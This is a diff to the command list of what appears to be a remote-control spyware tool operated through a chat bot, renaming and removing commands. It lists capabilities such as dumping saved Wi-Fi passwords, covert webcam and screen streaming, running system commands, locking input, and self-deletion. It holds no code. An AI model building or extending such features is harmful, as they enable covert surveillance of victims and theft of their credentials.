@@ -11,7 +11,7 @@ clear - Removes all cv2 windows, closes webcam and removes temporary files.
 selfdestruction - Removes the program from the machine permanently.
 🌐 Network & Remote Access
 wifiinfo - Dump saved Wi-Fi SSIDs and passwords.
-ipinfo - Get public IP and geolocation.
+getip - Get public IP and geolocation.
 📸 Camera & Screen
 selfie - Take a webcam selfie.
 screenshot - Capture screen.
@@ -21,10 +21,10 @@ screenclip - Record screen.
 recordjum - Records 20 second clip of jumpscare.
 waitforface - Send a webcam photo when face is detected till timeout.
 displaymode - Send a display set menu.
-webcamtunnelstart - Sets you a link to a webcam stream.
-screentunnelstart - Sets you a link to a screen stream.
-webcamtunnelstop - Stops the webcam stream.
-screentunnelstop - Stops the screen stream.
+webcamstreamstart - Sets you a link to a webcam stream.
+screenstreamstart - Sets you a link to a screen stream.
+webcamstreamstop - Stops the webcam stream.
+screenstreamstop - Stops the screen stream.
 🔊 Audio & Volume
 breath - Play breathing sound.
 pss - Play "psst" sound.
@@ -49,10 +49,8 @@ execute - Run system command.
 processkiller - Shows a table of processes that you can kill.
 terminateprocess - Kills a process by name.
 procmonmenu - Shows procmon menu.
-processmonadd - Adds a process to the process monitor list.
-processmonrem - Removes a process to the process monitor list.
-📂 File Explorer
-fileexplorer - Displays a file explorer menu.
+procmonadd - Adds a process to the process monitor list.
+procmonrem - Removes a process to the process monitor list.
 🎮 Input / Device Control
 randomkeyboard - Sets all user's input to random characters.
 capslock - Activates capslock.
@@ -61,7 +59,6 @@ mouselock - Locks the mouse in position.
 📋 Messaging
 bsend - Send custom text.
 id - Get Owner Chat ID.
-quickmenu - Opens a quick menu.
 🔒 Can't Open List
 cantopenadd - Adds process to cantopenlist.
 cantopenremove - Removes process from cantopenlist.
